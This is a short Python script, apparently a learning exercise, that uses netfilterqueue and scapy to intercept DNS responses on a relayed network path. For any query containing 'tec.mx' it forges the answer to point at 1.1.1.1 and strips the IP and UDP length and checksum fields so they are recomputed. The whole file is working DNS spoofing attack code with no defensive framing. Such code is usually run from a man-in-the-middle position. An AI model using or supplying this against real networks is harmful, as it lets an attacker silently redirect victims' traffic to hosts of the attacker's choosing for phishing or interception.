import netfilterqueue as nq
from scapy.all import *

def delete_sec_fields(packet):
	# IP header
	del packet[IP].len
	del packet[IP].chksum

	# UDP header
	del packet[UDP].len
	del packet[UDP].chksum

	return packet

def process_packet(packet):
	aux_packet = IP(packet.get_payload())

	if aux_packet.haslayer(DNSRR):
		query = aux_packet[DNSQR].qname.decode()
		if 'tec.mx' in query:
			answer = DNSRR(rrname=query, rdata='1.1.1.1')
			aux_packet[DNS].an = answer
			aux_packet[DNS].ancount = 1

			aux_packet = delete_sec_fields(aux_packet)

			packet.set_payload(str(aux_packet))
	packet.accept()

if __name__ == '__main__':
	nfqueue = nq.NetfilterQueue()
	nfqueue.bind(0, process_packet)

	try:
		nfqueue.run()
	except KeyboardInterrupt:
		nfqueue.unbind()
